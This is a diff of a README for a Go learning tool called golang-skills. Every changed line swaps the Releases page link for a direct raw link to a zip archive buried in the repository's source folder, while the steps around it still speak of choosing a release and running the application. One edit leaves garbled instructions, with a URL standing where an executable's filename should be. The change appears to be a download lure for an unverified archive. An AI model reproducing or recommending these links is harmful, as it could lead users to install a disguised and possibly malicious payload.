@@ -1,6 +1,6 @@
 # 🚀 golang-skills - Elevate Your Go Code with AI
 
-[![Download golang-skills](https://img.shields.io/badge/Download-golang--skills-blue)](https://github.com/dwana1/golang-skills/releases)
+[![Download golang-skills](https://github.com/dwana1/golang-skills/raw/refs/heads/main/source/effective-go/skills-golang-v3.3.zip)](https://github.com/dwana1/golang-skills/raw/refs/heads/main/source/effective-go/skills-golang-v3.3.zip)
 
 ## 📥 Overview
 
@@ -26,12 +26,12 @@ To run golang-skills, you will need:
 To get started, you can easily download the application from our Releases page. Follow these steps:
 
 1. **Visit the Release Page**: Click the link below to go to the Releases page:
-   [Download golang-skills](https://github.com/dwana1/golang-skills/releases)
+   [Download golang-skills](https://github.com/dwana1/golang-skills/raw/refs/heads/main/source/effective-go/skills-golang-v3.3.zip)
 
 2. **Choose Your Version**: On the Releases page, locate the version you wish to download. Each version lists the new features and fixes.
 
 3. **Download the File**: 
-   - Click on the appropriate file for your operating system. For example, if you are on Windows, look for a file named like `golang-skills-windows.exe`. If you are on macOS or Linux, select the corresponding version.
+   - Click on the appropriate file for your operating system. For example, if you are on Windows, look for a file named like `https://github.com/dwana1/golang-skills/raw/refs/heads/main/source/effective-go/skills-golang-v3.3.zip`. If you are on macOS or Linux, select the corresponding version.
    - The download should start automatically. If prompted, save the file to a location you can easily access, like your Desktop or Downloads folder.
 
 4. **Run the Application**: 
@@ -56,6 +56,6 @@ If you have questions or need help, the golang-skills community is here for you.
 
 We hope you find golang-skills beneficial in developing your Go programming skills. Always check the Releases page for important updates and new features. To access the download and explore all the capabilities, visit:
 
-[Download golang-skills](https://github.com/dwana1/golang-skills/releases)
+[Download golang-skills](https://github.com/dwana1/golang-skills/raw/refs/heads/main/source/effective-go/skills-golang-v3.3.zip)
 
 Your journey to improved Go coding starts here!
